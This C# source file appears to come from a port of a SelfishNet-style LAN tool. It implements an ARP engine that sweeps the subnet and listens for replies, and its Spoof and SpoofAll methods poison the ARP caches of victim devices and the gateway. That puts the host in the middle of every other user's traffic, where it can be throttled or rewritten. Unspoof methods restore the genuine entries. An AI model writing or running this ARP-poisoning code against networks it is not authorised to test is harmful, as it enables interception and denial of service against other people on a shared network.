// FREE MODEL TEST PROTOTYPE — ArpEngine: scanner, ARP listener, spoofer/unspoofer.
// Faithful to CArp: opcode-1 subnet sweep (5ms pacing), opcode-2 listener,
// twin-spoof pair every 5000ms, 35x genuine restore on stop/exit.

using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;

namespace SelfishNetV2.Test.Core;

public sealed class ArpEngine : IDisposable
{
    private readonly DeviceManager _devices;
    private IntPtr _arpHandle = IntPtr.Zero;
    private CancellationTokenSource? _cts;
    private Task? _listenerTask;
    private Task? _scannerTask;

    public AdapterInfo? Adapter { get; private set; }
    public bool IsDiscovering { get; private set; }
    public bool IsListening { get; private set; }

    public event Action<string>? Error;

    public ArpEngine(DeviceManager devices) => _devices = devices;

    public bool Open(AdapterInfo adapter)
    {
        Close();
        Adapter = adapter;
        _arpHandle = NpcapInterop.OpenLive(adapter.PcapName, "arp", out string err);
        if (_arpHandle == IntPtr.Zero)
        {
            Error?.Invoke(err);
            return false;
        }
        // Register local PC + gateway placeholders immediately.
        var local = _devices.AddOrUpdateTracked(adapter.LocalIp, adapter.Mac, isGateway: false, isLocal: true);
        local.Name = "local";
        if (adapter.GatewayIp != null)
        {
            var gw = _devices.AddOrUpdateTracked(adapter.GatewayIp,
                PhysicalAddress.Parse("00-00-00-00-00-00"), isGateway: true, isLocal: false);
            gw.Name = "gateway";
        }
        StartListener();
        return true;
    }

    private void StartListener()
    {
        if (IsListening || _arpHandle == IntPtr.Zero) return;
        IsListening = true;
        _cts = new CancellationTokenSource();
        var ct = _cts.Token;
        _listenerTask = Task.Run(() => ListenerLoop(ct), ct);
    }

    private void ListenerLoop(CancellationToken ct)
    {
        IntPtr hdr = IntPtr.Zero, data = IntPtr.Zero;
        var localMac = Adapter?.Mac;
        while (!ct.IsCancellationRequested && _arpHandle != IntPtr.Zero)
        {
            int rc;
            try { rc = NpcapInterop.pcap_next_ex(_arpHandle, ref hdr, ref data); }
            catch { break; }
            if (rc != 1) continue; // 0=timeout, negative=error/break
            try
            {
                var h = Marshal.PtrToStructure<NpcapInterop.PcapPkthdr>(hdr);
                int len = (int)Math.Min(h.caplen, h.len);
                if (len < ArpPacket.FrameLength) continue;
                var frame = new byte[len];
                Marshal.Copy(data, frame, 0, len);
                if (!ArpPacket.TryParse(frame, len, out ushort opcode,
                        out var senderMac, out var senderIp, out _, out _)) continue;
                if (opcode != 2) continue; // replies only (original arpListener)
                if (localMac != null && senderMac.ToString() == localMac.ToString()) continue;
                bool isGw = Adapter?.GatewayIp?.Equals(senderIp) == true;
                bool isLocal = senderIp.Equals(Adapter?.LocalIp);
                var dev = _devices.AddOrUpdateTracked(senderIp, senderMac, isGw, isLocal);
                if (string.IsNullOrEmpty(dev.Name) || dev.Name == senderIp.ToString())
                {
                    dev.Name = senderIp.ToString();
                    HostResolver.ResolveInBackground(dev);
                }
            }
            catch { /* keep listening */ }
        }
    }

    /// <summary>Subnet sweep with ARP requests, 5ms pacing (original discoverer).</summary>
    public void StartDiscovery()
    {
        if (IsDiscovering || Adapter == null || _arpHandle == IntPtr.Zero) return;
        IsDiscovering = true;
        _scannerTask = Task.Run(async () =>
        {
            try
            {
                foreach (var target in NetworkInterfaces.EnumerateSubnet(Adapter.LocalIp, Adapter.Mask))
                {
                    if (!IsDiscovering) break;
                    try
                    {
                        byte[] req = ArpPacket.BuildRequest(Adapter.Mac, Adapter.LocalIp, target);
                        NpcapInterop.pcap_sendpacket(_arpHandle, req, req.Length);
                    }
                    catch { /* per-host errors are non-fatal */ }
                    await Task.Delay(5);
                }
            }
            finally { IsDiscovering = false; }
        });
    }

    public void StopDiscovery() => IsDiscovering = false;

    /// <summary>Twin-spoof pair: victim thinks we are the router; router thinks we are the victim.
    /// Plus the original's self-refresh frame so our own listener re-learns the
    /// TRUE router MAC every round (keeps upload rewriting aimed correctly).</summary>
    public void Spoof(Device victim)
    {
        if (Adapter?.GatewayIp == null || _arpHandle == IntPtr.Zero || victim.IsLocalPc || victim.IsGateway) return;
        try
        {
            byte[] toVictim = ArpPacket.BuildSpoofReply(Adapter.Mac, Adapter.GatewayIp, victim.Mac, victim.Ip);
            byte[] toRouter = ArpPacket.BuildSpoofReply(Adapter.Mac, victim.Ip, RouterMac(), Adapter.GatewayIp);
            NpcapInterop.pcap_sendpacket(_arpHandle, toVictim, toVictim.Length);
            NpcapInterop.pcap_sendpacket(_arpHandle, toRouter, toRouter.Length);
            byte[] refresh = ArpPacket.BuildSelfRefresh(Adapter.Mac, Adapter.LocalIp, RouterMac(), Adapter.GatewayIp);
            NpcapInterop.pcap_sendpacket(_arpHandle, refresh, refresh.Length);
        }
        catch { /* send failures surface via forwarder errors */ }
    }

    /// <summary>Global spoof: poisons every discovered device (except local PC and gateway).
    /// Returns the number of targeted devices.</summary>
    public int SpoofAll()
    {
        int n = 0;
        foreach (var v in _devices.Devices)
        {
            if (v.IsLocalPc || v.IsGateway) continue;
            Spoof(v);
            n++;
        }
        return n;
    }

    /// <summary>Genuine restore pair for one victim.</summary>
    public void Unspoof(Device victim, int repetitions = 35)
    {
        if (Adapter?.GatewayIp == null || _arpHandle == IntPtr.Zero) return;
        try
        {
            byte[] toVictim = ArpPacket.BuildRestoreReply(RouterMac(), Adapter.GatewayIp, victim.Mac, victim.Ip);
            byte[] toRouter = ArpPacket.BuildRestoreReply(victim.Mac, victim.Ip, RouterMac(), Adapter.GatewayIp);
            for (int i = 0; i < repetitions; i++)
            {
                NpcapInterop.pcap_sendpacket(_arpHandle, toVictim, toVictim.Length);
                NpcapInterop.pcap_sendpacket(_arpHandle, toRouter, toRouter.Length);
            }
        }
        catch { /* best-effort heal */ }
    }

    public void UnspoofAll(IEnumerable<Device> victims, int repetitions = 35)
    {
        foreach (var v in victims)
            if (!v.IsLocalPc && !v.IsGateway) Unspoof(v, repetitions);
    }

    /// <summary>Heals every spoofed device on this LAN (used on Stop/exit).</summary>
    public void UnspoofAll(int repetitions = 35)
    {
        foreach (var v in _devices.Devices)
            if (!v.IsLocalPc && !v.IsGateway) Unspoof(v, repetitions);
    }

    private PhysicalAddress RouterMac()
    {
        if (Adapter?.GatewayIp != null && _devices.TryGetByIp(Adapter.GatewayIp, out var gw) && gw != null)
            return gw.Mac;
        return PhysicalAddress.Parse("00-00-00-00-00-00");
    }

    public bool GatewayMacKnown()
    {
        if (Adapter?.GatewayIp == null) return false;
        if (!_devices.TryGetByIp(Adapter.GatewayIp, out var gw) || gw == null) return false;
        string s = gw.Mac.ToString().Trim('0');
        return s.Length > 0;
    }

    /// <summary>Active MAC resolution (original findMac/findMacRouter): broadcast
    /// ARP "who-has" for <paramref name="ip"/>. The reply is learned by our listener.</summary>
    public void ResolveMac(IPAddress ip, int attempts = 3)
    {
        if (Adapter == null || _arpHandle == IntPtr.Zero) return;
        try
        {
            for (int i = 0; i < attempts && !GatewayMacKnown(); i++)
            {
                byte[] req = ArpPacket.BuildRequest(Adapter.Mac, Adapter.LocalIp, ip);
                NpcapInterop.pcap_sendpacket(_arpHandle, req, req.Length);
                Thread.Sleep(250);
            }
        }
        catch { /* best-effort */ }
    }

    public void Close()
    {
        StopDiscovery();
        try { _cts?.Cancel(); } catch { }
        IsListening = false;
        if (_arpHandle != IntPtr.Zero)
        {
            try { NpcapInterop.pcap_close(_arpHandle); } catch { }
            _arpHandle = IntPtr.Zero;
        }
    }

    public void Dispose() => Close();
}
